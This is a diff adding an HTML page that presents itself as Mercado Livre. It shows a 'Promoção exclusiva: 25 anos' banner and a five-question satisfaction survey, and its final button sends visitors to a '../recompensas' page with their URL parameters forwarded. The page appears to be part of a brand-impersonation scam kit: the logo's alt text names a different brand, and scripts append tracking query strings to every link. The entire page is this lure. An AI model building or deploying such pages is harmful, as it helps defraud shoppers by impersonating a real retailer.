@@ -1,0 +1,275 @@
+<!DOCTYPE html><html lang="pt-br"><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <link rel="stylesheet" href="css/styles.css">
+    <link rel="stylesheet" href="css/fonts.css">
+
+    <link rel="icon" href="images/favico.jpg" type="image/x-icon">
+    <link rel="apple-touch-icon" sizes="180x180" href="images/favico.jpg">
+
+    <link rel="stylesheet" href="css2">
+    <title>Mercado Livre</title>
+<script src="js/latest.js" async="" defer=""></script>
+    <script>
+        function onLoad() {
+            var links = document.getElementsByTagName("a");
+
+            for (var i = 0, n = links.length; i < n; i++) {
+            if (links[i].href.includes("#")) {
+                continue;
+            }
+
+            var href =
+                links[i].href.trim() +
+                (links[i].href.indexOf("?") > 0 ? "&" : "?") +
+                document.location.search.replace("?", "").toString();
+            links[i].href = href;
+            }
+        }
+
+        document.addEventListener("DOMContentLoaded", onLoad);
+    </script>
+
+
+</head>
+<body>
+
+
+    <div style="background-color: #e6cf00; text-align: center; padding: 5px; font-family: 'GellixMedium'; font-size: 13px; color: white">Promoção exclusiva: 25 anos</div>
+
+
+    <nav class="navbar" style="padding-top: 15px;">
+        <div class="menu-icon" style="padding-left: 3%;">
+            <img src="images/logo.webp" style="height: 5vh;" alt="Logo Central Vivara">
+        </div>
+
+        <div class="logo-central">
+        </div>
+
+        <div class="menu-icon" style="padding-right: 3%;">
+            <span class="material-symbols-outlined" style="font-size: 30px; padding-right: 10px; color: black">menu</span>
+        </div>
+    </nav>
+    
+    <div id="progress1" style="display: block">
+        <p style="text-align: center; font-family: 'GellixSemiBold'; font-size: 22px; padding-top: 10px;">Pergunta 1 / 5</p>
+
+        <div class="progress-container">
+            <div class="progress-bar">
+                <div class="progress"></div>
+            </div>
+        </div>
+    </div>
+
+    <div id="progress2" style="display: none;">
+        <p style="text-align: center; font-family: 'GellixSemiBold'; font-size: 22px; padding-top: 10px;">Pergunta 2 / 5</p>
+
+        <div class="progress-container">
+            <div class="progress-bar">
+                <div class="progress2"></div>
+            </div>
+        </div>
+    </div>
+
+    <div id="progress3" style="display: none;">
+        <p style="text-align: center; font-family: 'GellixSemiBold'; font-size: 22px; padding-top: 10px;">Pergunta 3 / 5</p>
+
+        <div class="progress-container">
+            <div class="progress-bar">
+                <div class="progress3"></div>
+            </div>
+        </div>
+    </div>
+
+    <div id="progress4" style="display: none;">
+        <p style="text-align: center; font-family: 'GellixSemiBold'; font-size: 22px; padding-top: 10px;">Pergunta 4 / 5</p>
+
+        <div class="progress-container">
+            <div class="progress-bar">
+                <div class="progress4"></div>
+            </div>
+        </div>
+    </div>
+
+    <div id="progress5" style="display: none;">
+        <p style="text-align: center; font-family: 'GellixSemiBold'; font-size: 22px; padding-top: 10px;">Pergunta 5 / 5</p>
+
+        <div class="progress-container">
+            <div class="progress-bar">
+                <div class="progress5"></div>
+            </div>
+        </div>
+    </div>
+
+
+
+
+
+    <div class="pergunta" id="p1">
+        <p class="pergunta_title">Como você avaliaria a experiência de compra no Mercado Livre em termos de facilidade de uso do site ou aplicativo?</p>
+
+        <div class="radio-container">
+            <label>
+                <input type="radio" name="difficulty" value="muito-facil">
+                Muito fácil
+            </label>
+            <label>
+                <input type="radio" name="difficulty" value="facil">
+                Fácil
+            </label>
+            <label>
+                <input type="radio" name="difficulty" value="moderadamente-facil">
+                Moderadamente fácil
+            </label>
+            <label>
+                <input type="radio" name="difficulty" value="dificil">
+                Difícil
+            </label>
+        </div>
+
+        <button class="pergunta-botao" onclick="showAd2();">Enviar</button>
+
+        <div style="padding-bottom: 20px;"></div>
+    </div>
+
+
+
+    <div class="pergunta" id="p2" style="display: none">
+        <p class="pergunta_title">Qual é a sua opinião sobre a variedade de produtos disponíveis no Mercado Livre?</p>
+
+        <div class="radio-container">
+            <label>
+                <input type="radio" name="difficulty" value="muito-facil">
+                Excelente
+            </label>
+            <label>
+                <input type="radio" name="difficulty" value="facil">
+                Boa
+            </label>
+            <label>
+                <input type="radio" name="difficulty" value="moderadamente-facil">
+                Aceitável
+            </label>
+            <label>
+                <input type="radio" name="difficulty" value="dificil">
+                Insatisfatória
+            </label>
+        </div>
+
+        <button class="pergunta-botao" onclick="showAd3();">Enviar</button>
+
+        <div style="padding-bottom: 20px;"></div>
+    </div>
+
+
+
+    <div class="pergunta" id="p3" style="display: none">
+        <p class="pergunta_title">Como você classificaria a eficiência da entrega dos produtos comprados no Mercado Livre?</p>
+
+        <div class="radio-container">
+            <label>
+                <input type="radio" name="difficulty" value="muito-facil">
+                Rápida
+            </label>
+            <label>
+                <input type="radio" name="difficulty" value="facil">
+                Aceitável
+            </label>
+            <label>
+                <input type="radio" name="difficulty" value="moderadamente-facil">
+                Lenta
+            </label>
+            <label>
+                <input type="radio" name="difficulty" value="dificil">
+                Muito Lenta
+            </label>
+        </div>
+
+        <button class="pergunta-botao" onclick="showAd4();">Enviar</button>
+
+        <div style="padding-bottom: 20px;"></div>
+    </div>
+
+
+
+    <div class="pergunta" id="p4" style="display: none">
+        <p class="pergunta_title">Em relação ao atendimento ao cliente do Mercado Livre, como você o descreveria?</p>
+
+        <div class="radio-container">
+            <label>
+                <input type="radio" name="difficulty" value="muito-facil">
+                Excelente
+            </label>
+            <label>
+                <input type="radio" name="difficulty" value="facil">
+                Bom
+            </label>
+            <label>
+                <input type="radio" name="difficulty" value="moderadamente-facil">
+                Regular
+            </label>
+            <label>
+                <input type="radio" name="difficulty" value="dificil">
+                Insatisfatório
+            </label>
+        </div>
+
+        <button class="pergunta-botao" onclick="showAd5();">Enviar</button>
+
+        <div style="padding-bottom: 20px;"></div>
+    </div>
+
+
+
+    <div class="pergunta" id="p5" style="display: none">
+        <p class="pergunta_title">Como você avalia a precisão das descrições dos produtos no Mercado Livre?</p>
+
+        <div class="radio-container">
+            <label>
+                <input type="radio" name="difficulty" value="muito-facil">
+                Muito precisa
+            </label>
+            <label>
+                <input type="radio" name="difficulty" value="facil">
+                Precisa
+            </label>
+            <label>
+                <input type="radio" name="difficulty" value="moderadamente-facil">
+                Moderadamente precisa
+            </label>
+            <label>
+                <input type="radio" name="difficulty" value="dificil">
+                Imprecisa
+            </label>
+        </div>
+
+        <button class="pergunta-botao" id="recompensas">Enviar</button>
+
+        <div style="padding-bottom: 20px;"></div>
+    </div>
+    
+    
+
+    
+
+
+    <script src="js/scripts.js"></script>
+
+
+    <script>
+      setTimeout(function () {
+      var button = document.querySelector("#recompensas");
+  
+      // Alterando a variável link para a nova URL
+      var link = "../recompensas";
+  
+      button.addEventListener("click", function () {
+          window.location.href = link + window.location.search;
+      });
+  }, 1000);
+    </script>
+
+
+
+
+</body></html>
